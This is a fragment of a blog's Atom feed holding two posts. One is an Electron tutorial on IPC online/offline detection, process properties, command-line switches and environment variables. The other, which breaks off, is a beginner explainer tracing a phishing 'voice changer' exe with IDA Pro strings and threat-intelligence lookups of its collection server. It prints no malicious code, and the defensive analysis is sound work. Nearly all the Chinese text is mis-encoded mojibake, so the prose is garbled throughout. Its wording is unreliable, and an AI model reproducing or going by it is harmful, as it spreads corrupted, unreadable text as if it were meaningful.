href="#Electron-Âú®Á∫ø-Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã" class="headerlink" title="Electron Âú®Á∫ø/Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã"></a>Electron Âú®Á∫ø/Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã</h2><blockquote><p>TipsÔºöelectron v4.02‰∏≠ÁöÑ‰∏ªËøõÁ®ãÂíåÊ∏≤ÊüìËøõÁ®ãËøõË°åÈÄö‰ø°ÁöÑÊó∂ÂÄôÔºåÂ∞±ÈúÄË¶ÅÁî®Âà∞<code>ipc</code>Ëøô‰∏™ÁâπÊÄß„ÄÇËÄå<code>ipc</code>ÂèàÂàÜ‰∏∫<code>ipcMain</code>Âíå<code>ipcRenderer</code>‰∏§‰∏™ÔºåÂàÜÂà´Áî®‰∫é‰∏ªËøõÁ®ãÂíåÊ∏≤ÊüìËøõÁ®ã„ÄÇ</p><p>letÂëΩ‰ª§ÂíåvarÂëΩ‰ª§‰∏çÂêåÁöÑÂú∞ÊñπÊòØletÁöÑÂØπË±°Âè™Âú®letÊâÄÂú®ÁöÑ‰ª£Á†ÅÂùóËåÉÂõ¥‰∏≠Ëµ∑‰ΩúÁî®„ÄÇ</p></blockquote><p>ËøôÈáåÈúÄË¶ÅÁî®Âà∞navigatorÂØπË±°Ôºå‰ΩÜÊòØÂú®electron‰∏ªËøõÁ®ã‰∏≠Ê≤°ÊúâËøô‰∏™ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Ê∏≤ÊüìËøõÁ®ãÔºåÂà©Áî®IPCÈÄö‰ø°ÔºåËé∑ÂèñÁΩëÁªúÁä∂ÊÄÅ„ÄÇ</p><p>Âú®ÊàëÁöÑÁéØÂ¢É‰∏≠ÂèØ‰ª•ÈÄöËøá‰ª•‰∏ã‰ª£Á†ÅÂÆûË∑µÊàêÂäüÔºö</p><p><code>main.js</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>ipcMain<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token keyword">let</span> onlineStatusWindowapp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  onlineStatusWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> show<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  onlineStatusWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/online-status.html`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><code>online-status.html</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">const</span> <span class="token punctuation">{</span>ipcRenderer<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> updateOnlineStatus <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>onLine <span class="token operator">?</span> <span class="token string">'online'</span> <span class="token punctuation">:</span> <span class="token string">'offline'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*navigator.onLine ==> true or false*/</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  <span class="token function">updateOnlineStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Electron-ËøõÁ®ã"><a href="#Electron-ËøõÁ®ã" class="headerlink" title="Electron ËøõÁ®ã"></a>Electron ËøõÁ®ã</h2><p>ElectronÁöÑ<code>process</code>ÂØπË±°</p><pre class=" language-javascript"><code class="language-javascript">process<span class="token punctuation">.</span>type <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñËøõÁ®ãÁ±ªÂûãprocess<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'electron'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñelectronÁâàÊú¨process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'chrome'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñchromiumÁöÑÁâàÊú¨process<span class="token punctuation">.</span>resourcePath <span class="token operator">-</span> String <span class="token operator">-</span> JavascriptÊ∫ê‰ª£Á†ÅË∑ØÂæÑ<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span>noAsar <span class="token operator">=</span> <span class="token boolean">true</span> or <span class="token boolean">false</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span><span class="token function">hang</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//‰ΩøÂæóËøõÁ®ãÁöÑ‰∏ªÁ∫øÁ®ãÊåÇËµ∑</span></code></pre><h2 id="Electron-ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥"><a href="#Electron-ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥" class="headerlink" title="Electron ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥"></a>Electron ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥</h2><p>Âú®appÊ®°ÂùóÁöÑready‰∫ã‰ª∂ÂèëÂá∫‰πãÂâçÂèØ‰ª•ÈÄöËøá<code>app.commandLine.appendSwitch</code>Êù•Ê∑ªÂä†ÊåáÂÆöÁöÑÂëΩ‰ª§ÂèÇÊï∞Âà∞mainËÑöÊú¨‰∏≠Ôºö</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>app<span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'remote-debugging-port'</span><span class="token punctuation">,</span> <span class="token string">'8315'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'host-rules'</span><span class="token punctuation">,</span> <span class="token string">'MAP * 127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Your code here</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êõ¥Â§öÁöÑÂëΩ‰ª§ÂèÇÊï∞ÂèØÂèÇËÄÉÔºö<a href="https://www.w3cschool.cn/electronmanual/82vz1ql9.html" target="_blank" rel="noopener">Electron‰∏≠ÊñáÊñáÊ°£</a></p><h2 id="Electron-ÁéØÂ¢ÉÂèòÈáè"><a href="#Electron-ÁéØÂ¢ÉÂèòÈáè" class="headerlink" title="Electron ÁéØÂ¢ÉÂèòÈáè"></a>Electron ÁéØÂ¢ÉÂèòÈáè</h2><p>‰∏Ä‰∫õ Electron ÁöÑË°å‰∏∫ÂèóÂà∞ÁéØÂ¢ÉÂèòÈáèÁöÑÊéßÂà∂ÔºåÂõ†‰∏∫‰ªñ‰ª¨ÁöÑÂàùÂßãÂåñÊØîÂëΩ‰ª§Ë°åÂíåÂ∫îÁî®‰ª£Á†ÅÊõ¥Êó©„ÄÇ‰ª•‰∏ã ÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÁéØÂ¢ÉÂèòÈáèÂêç</p><pre class=" language-bash"><code class="language-bash">//<span class="token operator">></span>set ELECTRON_ENABLE_LOGGING<span class="token operator">=</span>true//<span class="token operator">></span>electronELECTRON_RUN_AS_NODEELECTRON_ENABLE_LOGGINGELECTRON_LOG_ASAR_READSELECTRON_ENABLE_STACK_DUMPINGELECTRON_DEFAULT_ERROR_MODEELECTRON_NO_ATTACH_CONSOLEELECTRON_FORCE_WINDOW_MENU_BARELECTRON_HIDE_INTERNAL_MODULES</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Electron.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="http://www.yof3ng.xyz/categories/Programming/"/>
    
    
      <category term="Electron" scheme="http://www.yof3ng.xyz/tags/Electron/"/>
    
      <category term="Programming" scheme="http://www.yof3ng.xyz/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑--ÁßëÊôÆÁØá</title>
    <link href="http://www.yof3ng.xyz/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
    <id>http://www.yof3ng.xyz/2018/11/20/ËøΩË∏™Ê∫ØÊ∫ê-Â∞èÁôΩÁßëÊôÆÁØá/</id>
    <published>2018-11-20T14:43:11.000Z</published>
    <updated>2019-04-02T08:47:26.552Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËøΩË∏™Ê∫ØÊ∫ê-ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá"><a href="#ËøΩË∏™Ê∫ØÊ∫ê-ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá" class="headerlink" title="ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá"></a>ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá</h1><blockquote><p>üÜí‰∏ÄÁõ¥‰∏ÄÁõ¥‰ª•Êù•ÔºåÊÄªÊòØÊúâ‰∫∫‰∏çÊñ≠Ë¢´ÁõóqqÔºåÁÑ∂ÂêéË¢´Áî®‰ª•ÊÅ∂ÊÑèÁõóÂè∑ËÄÖÊï£Êí≠Êõ¥Â§öÁöÑÊÅ∂ÊÑèÈìæÊé•ÊàñËÄÖËøõË°åËØàÈ™óÁõàÂà©Ê¥ªÂä®ÔºåÊÅ∂ÊÄßÂæ™ÁéØÔºåÊÑàÊºîÊÑàÁÉàÔºå‰∏∫‰∫ÜÁªôÂêåÂ≠¶‰ª¨Á®çÂæÆÁßëÊôÆ‰∏Ä‰∏ãÂü∫Êú¨ÁöÑÁõóÂè∑ÂéüÁêÜÔºåÊïÖÊúâÊ≠§Êñá„ÄÇ</p><p>‰ªéÊâ´‰∫åÁª¥Á†ÅÁõóÂè∑ÔºåÂà∞Ê®°ÊãüqqÁôªÂΩïÁïåÈù¢ÁöÑÈíìÈ±ºÁΩëÁ´ôÁõóÂè∑ÔºåÂÜçÂà∞‰º™ÈÄ†qqÂú®Á∫øÊñáÊ°£ËØ±ÂØºqqÁî®Êà∑ÁÇπÂáªÂØºËá¥ÁöÑÁõóÂè∑ÔºåÊÄª‰πãÁõóÂè∑ÁöÑÊñπÂºèÂêÑÁßçÂêÑÊ†∑Ôºå‰ΩÜÈÉΩÁ¶ª‰∏çÂºÄ‰∏Ä‰∏™ÈáçÁÇπÔºå<strong>ÈÇ£Â∞±ÊòØ‰Ω†ÁöÑË¥¶Âè∑ÊòØ‰ªé‰Ω†ÁöÑËÆæÂ§á‰∏äÈù¢‰º†ËæìÁªôÂà´‰∫∫ÁöÑ</strong>ÔºàÂ¶ÇÊûú‰Ω†Ê≤°ÊúâÂà∞Â§ÑÂÆ£Êâ¨‰Ω†ÁöÑÂØÜÁ†ÅÁöÑËØùüòÑÔºâÔºåÊàñÊòØËÆæÂ§áË¢´Ê§çÂÖ•Êú®È©¨ÔºåËÆ∞ÂΩïÈîÆÁõòËæìÂÖ•ÔºåÊäëÊàñÊòØ‰º™ÈÄ†È°µÈù¢‰ΩøÂæóÁî®Êà∑‰∏ªÂä®ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÁ≠âÁ≠âÁ≠âÁ≠â„ÄÇ</p><p>Êó¢ÁÑ∂Áü•ÈÅìÔºåË¥¶Âè∑ÂØÜÁ†ÅÊòØ‰ªéËá™Â∑±ÁöÑËÆæÂ§á‰∏ä‰º†Âà∞ÊÅ∂ÊÑèÁõóÂè∑ËÄÖÊâã‰∏äÁöÑÔºåÈÇ£‰πàÈóÆÈ¢òÂ∞±ÂèòÂæóÁÆÄÂçï‰∫Ü„ÄÇ</p><p>Êé•‰∏ãÊù•Â∞±‰ªé‰∏Ä‰∏™ÈÇÆ‰ª∂ÈíìÈ±ºËØ¥Ëµ∑Ôºå‰∫ãÊÉÖÊòØËøôÊ†∑Â≠êÁöÑ‚Ä¶‚Ä¶</p></blockquote><h2 id="0x00-Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂"><a href="#0x00-Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂" class="headerlink" title="0x00 Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂"></a>0x00 Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>ÈÇÆ‰ª∂‰∏≠ÊúâÂèØÁà±ÁöÑËêåÂ¶πÂèòÂ£∞Âô®ÔºåÊúâÁ¶èÂà©Â∞èÁîµÂΩ±ÔºåÊ∏∏ÊàèÂä†ÈÄüÂô®ÁöÑÈìæÊé•ÔºåÂèØË∞ìÊòØÂê∏Âºï‰∫∫ÊûÅ‰∫ÜÔºåÊàë‰ª¨ÂÖàÂéªËøô‰∏™ÈìæÊé•‰∏ãËΩΩ‰∏Ä‰∏™ËêåÂ¶πÂèòÂ£∞Âô®Áé©‰∏Ä‰∏ã„ÄÇ</p><p>ËøôÊòØ‰∏Ä‰∏™ÂçÅÂàÜÂÖ∏ÂûãÁöÑexeÊñá‰ª∂Ôºå‰∏ÄËà¨Á®çÂæÆÊúâ‰∫õÂü∫Á°ÄÁ¥†ÂÖªÁöÑ‰∫∫ÈÉΩ‰∏ç‰ºöÈöè‰æøÁÇπÂºÄËøôÁßçexeÊñá‰ª∂ÁöÑÂì¶„ÄÇÊØîexeÊñá‰ª∂Êõ¥ÂÆπÊòì‰∏≠ÊãõÁöÑÊòØÊñáÊ°£Êñá‰ª∂ÔºåÂ¶ÇdocÊñáÊ°£ÔºåÊÅ∂ÊÑè‰∫∫ÂëòÂèØËÉΩ‰ºöÂà©Áî®Â¶ÇofficeÁöÑÊºèÊ¥ûÔºåÂΩì‰Ω†ÁÇπÂºÄ‰ªñÁ≤æÂøÉÂà∂‰ΩúÁöÑÊñáÊ°£ÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöËß¶ÂèëÂ¶ÇÂÆèÁóÖÊØíÔºåËøúÁ®ã‰ª£Á†ÅÊâßË°åÁ≠âÈóÆÈ¢òÔºåÊ≠£‰∏≠‰∫∫‰∏ãÊÄÄ„ÄÇ</p></blockquote><p>ËôöÊãüÊú∫ÊòØ‰∏™Â•Ω‰∏úË•øÂë¢ÔºåÂ¶ÇÊûú‰Ω†Êúâ‰ªÄ‰πà‰∏úË•øÈùûË¶ÅÂÜíÁùÄÈ£éÈô©ÂéªËøêË°å‰∏Ä‰∏ãÔºåÈÇ£‰πà‰∏çÂ¶ÇË£Ö‰∏™ËôöÊãüÊú∫ÂÖàËØïËØïÊ∞¥ÔºåËøôÊ¨°ÂàÜÊûêÊàë‰ª¨Â∞±Âú®‰∏Ä‰∏™win7ÁöÑËôöÊãüÊú∫‰∏≠ËøõË°å„ÄÇ</p><h2 id="0x01-‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA-ProÔºâ-ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê"><a href="#0x01-‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA-ProÔºâ-ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê" class="headerlink" title="0x01 ‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA ProÔºâ ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê"></a>0x01 ‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA ProÔºâ ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê</h2><p>ÂÖ∂ÂÆûÈÉΩÊ≤°ÊÄé‰πàÂàÜÊûêÁ®ãÂ∫èÈÄªËæëÔºåÂõ†‰∏∫„ÄÇ„ÄÇ„ÄÇËøôÁ®ãÂ∫èÂ§™Á≤óÁ≥ô‰∫Ü„ÄÇ</p><p>‰∏ãËΩΩËêåÂ¶πÂèòÂ£∞Âô®.exeÂêéÔºåÂèØ‰ª•ÂÖàÁúãÁúãÊñá‰ª∂Â±ûÊÄßÂì¶Ôºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>Êñá‰ª∂Â§ßÂ∞è‰ªÖÊúâ707kbÔºå‰∏Ä‰∏™ÂèòÂ£∞Âô®‰Ω†ËßâÂæóÂè™ÈúÄË¶Å707kbÂ§ßÂ∞èÂêóÔºüÂæàÊòéÊòæ‰∏çÊ≠¢ÁöÑÂ•Ω‰∏çÂ•ΩÔºåÊØïÁ´üÂèòÂ£∞Âô®Ëøô‰πàÁßÄÁöÑÁé©ÊÑèÂÑøÊòØÂêß„ÄÇ</p><p>ÂÖàÁî®PC hunterÁõëÊéß‰∏Ä‰∏ãËøêË°åËØ•Êñá‰ª∂‰πãÂâçÔºåÊàë‰ª¨ÁöÑÁΩëÁªúÊÉÖÂÜµÔºàËøõÁ®ãÔºåÊúçÂä°Á≠â‰ø°ÊÅØÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>ÂèåÂáªËøêË°å‰∏Ä‰∏ã<code>ËêåÂ¶πÂèòÂ£∞Âô®.exe</code>Ôºåemmm‰∫ãÂÆûÊòØÂõ†‰∏∫ËôöÊãüÊú∫‰∏≠Áº∫Â∞ë‰∏Ä‰∫õÊñá‰ª∂ÂØºËá¥Êó†Ê≥ïËøêË°åÔºåÊ≠£Â∏∏ÊÉÖÂÜµ‰∏ãËøêË°å‰πãÂêéÂü∫Êú¨‰∏äÊòØÂèØ‰ª•ÁúãÂà∞‰ºöÊúâÂ§öÂá∫Êù•ÁöÑÂºÇÂ∏∏ËøõÁ®ãÔºåËÄåËøô‰∏™ËøõÁ®ã‰ºöÂØπÊüê‰∏™ipÊàñËÄÖÂüüÂêçËøõË°åËøûÊé•Ôºå‰º†ËæìÁ™ÉÂèñÁöÑ‰ø°ÊÅØÁ≠âÁ≠â„ÄÇ</p><p>ÈÇ£‰πàÊé•‰∏ãÊù•Áõ¥Êé•ÂàÜÊûêÂêßÔºåIDA ProÂèçÊ±áÁºñÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÈÄöËøáÂèçÊ±áÁºñ‰πãÂêéÔºåÁ®ãÂ∫èÂÜÖÈÉ®ÁöÑ‰∏Ä‰∫õ‰ø°ÊÅØ‰ª•Ê±áÁºñ‰ª£Á†ÅÁöÑÂΩ¢ÂºèÂ±ïÂºÄÔºå‰ΩÜÊòØÊàë‰ª¨Êó¢ÁÑ∂ÊòØ‰ª•ÁôΩËØùÊñáÁöÑÂΩ¢ÂºèÊù•ËÆ≤ËøôÁØáÁßëÊôÆÊñáÁ´†ÔºåÈÇ£ËÇØÂÆö‰∏çÊòØÂàÜÊûê‰ª£Á†ÅÂíØÔºåÂè™Ë¶ÅÊòéÁôΩËøô‰∏™ÊµÅÁ®ãÂ∞±Ë°åÂï¶„ÄÇ</p><p>Êé•‰∏ãÊù•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®IDA proÁöÑ<code>shift + f12</code>Âø´Êç∑ÈîÆÊù•ÊèêÂèñËøô‰∏™<code>ËêåÂ¶πÂèòÂ£∞Âô®.exe</code>‰∏≠ÁöÑ‰∏Ä‰∫õÂ≠óÁ¨¶‰∏≤ÔºåÊù•ÁúãÁúãÊúâÊ≤°ÊúâÂèØÁñëÁöÑÊòéÊòæÁöÑÁ∫øÁ¥¢„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>ÂæàÁÆÄÂçïÂ∞±ÁúãÂà∞‰∫Ü‰∏Ä‰∫õÂÖ≥ÈîÆÂ≠óÁúºÔºåÂ¶Ç<code>Connection==&gt;ËøûÊé•||Pipe==&gt;ÁÆ°ÈÅì||Hostname==&gt;‰∏ªÊú∫Âêç</code>Á≠â‰ø°ÊÅØ„ÄÇÂΩìÁÑ∂ÔºåÊõ¥È´òÁ∫ß‰∏ÄÁÇπÁöÑËΩØ‰ª∂ÊàñËÄÖÈíìÈ±ºÁ®ãÂ∫è‰∏ç‰ºöÂÉèËøô‰∏™Ëøô‰πàÁ≤óÁ≥ôÔºåËá≥Â∞ë‰ºöÁªôÂÖ≥ÈîÆÂ≠óÁ¨¶‰∏≤Âä†ÂØÜÔºåÂä†Â£≥ÊàñËÄÖÂä†ÂèçË∞ÉËØïÊé™ÊñΩÔºåËøôÈÉΩÊòØÂêéËØù‰∫ÜÔºà‰º∞ËÆ°Â∞èÁôΩÂê¨‰∏çÊáÇÔºâ„ÄÇ</p><p>ÈÇ£‰πàÂÜçÁªÜÁªÜÊâæÊâæÔºåËÉΩ‰∏çËÉΩÊâæÂà∞ËØ•ÈíìÈ±ºÁ®ãÂ∫èÊï£Â∏ÉËÄÖÁöÑË∏™ËøπÂë¢Ôºü</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" class="lazyload"></p><p>Êûú‰∏çÂÖ∂ÁÑ∂ÔºåIPÂú∞ÂùÄÊãøÂà∞‰∫ÜÔºåÂéªÁúã‰∏ÄÁúºÂñèÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" class="lazyload"></p><h2 id="0x02-ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê"><a href="#0x02-ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê" class="headerlink" title="0x02 ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê"></a>0x02 ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê</h2><p>‰∏äÈù¢ÁöÑÈÇ£‰∏™urlÊòØ‰∏Ä‰∏™Áî®Êù•Êé•Êî∂Á™ÉÂèñÂà∞ÁöÑ‰ø°ÊÅØÁöÑÊé•Âè£ÔºåÈÇ£‰πàÈÄöËøáÁé∞ÊúâÁöÑ‰ø°ÊÅØÔºåÊàë‰ª¨Â¶Ç‰ΩïÊ∑±‰∏ÄÊ≠•ËøΩË∏™Ê∫ØÊ∫êÂà∞Ëøô‰ΩçÂèØÁà±ÁöÑÁ®ãÂ∫èÊï£Â∏ÉËÄÖÂë¢Ôºü</p><p>ÂΩìÁÑ∂ÊòØÂ®ÅËÉÅÊÉÖÊä•ÂàÜÊûêÂπ≥Âè∞Ëµ∞‰∏ÄÊ≥¢ÂíØÔºàÂ¶ÇVTÔºåÂæÆÊ≠•ÔºâÔºåÂÖ∂ÂÆûÊàë‰ª¨‰∏ÄÂºÄÂßãÂ∞±ÂèØ‰ª•ÊääËØ•exeÊñá‰ª∂‰∏ä‰º†Âà∞Â®ÅËÉÅÊ£ÄÊµãÂπ≥Âè∞ËøõË°åÊ£ÄÊµãÔºàÂπ≥Âè∞ÂèØ‰ª•ÂØπURLÔºåMD5ÔºåIPÁ≠âÁ≠â‰ø°ÊÅØËøõË°åÂÖ≥ËÅîÊü•ËØ¢ÔºâÔºå‰ΩÜÊòØ‰∏∫‰∫ÜÊÉÖËäÇÈúÄË¶ÅÔºåÂÖàÁªÜÁªÜÂàÜÊûê‰∏Ä‰∏ãÊñá‰ª∂ÔºåÈÇ£‰πàÊàë‰ª¨Áé∞Âú®Ë¶ÅÂÅöÁöÑÊòØÁî®Â®ÅËÉÅÊÉÖÊä•Âπ≥Âè∞Êü•ÊâæÂæóÂà∞ÁöÑIPÂÖ≥ËÅî‰ø°ÊÅØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" class="lazyload"></p><p>ÂÆûÈôÖ‰∏äÁî®ÊúÄÂºÄÂßãÈÇÆÁÆ±‰∏≠Êî∂Âà∞ÁöÑÈÇ£‰∏™ÂüüÂêç‰πü‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÁúãÂÖ≥ËÅîÁöÑÊñá‰ª∂Ê£ÄÊµã‰ø°ÊÅØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Ê£ÄÊµãÂà∞‰∫ÜÂ®ÅËÉÅÔºåÂÖ∑Êúâ‰∏ÄÂÆöÁöÑÂç±Èô©ÊÄßÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" class="lazyload"></p><p>ÂÖ∂ÂÆûÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÂØπËØ•IPËøõË°åÊõ¥Ê∑±ÂÖ•ÁöÑ‰∫ÜËß£‰∫ÜÔºàÊîªÂáªÊòØ‰∏çÂèØËÉΩÊîªÂáªÁöÑÔºåÈ°∂Â§öÊâ´ÊèèÊâ´ÊèèÁõÆÂΩïÔºåÊâ´ÊèèÁõÆÂΩïÊàë‰πüÊòØÊ≤°ÊúâÊâ´ÁöÑÔºâÂõ†‰∏∫‰∏ãÈù¢ÂæóÂà∞ÁöÑÂá†‰∏™urlÂ∞±Â§üÊàë‰ª¨ÊâæÂà∞ÈÇ£‰∏™ÂèØÁà±ÁöÑ‰∫∫‰∫ÜÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" class="lazyload"></p><p>ËÆøÈóÆ‰∏Ä‰∏ãËøô‰∫õurlÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" 